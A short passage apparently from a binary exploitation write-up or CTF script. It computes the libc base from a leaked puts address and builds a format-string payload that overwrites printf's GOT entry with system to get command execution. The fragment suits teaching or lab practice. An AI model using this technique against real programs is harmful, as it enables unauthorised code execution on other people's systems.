...
libc.address = puts_leak - libc.function('puts')      # Updating the libc base by subtracting 
system = libc.function('system')                      # `system` address 
payload = fmtstr32(7, {printf:  system})       # Overwiting the GOT address of `printf` with `system` address
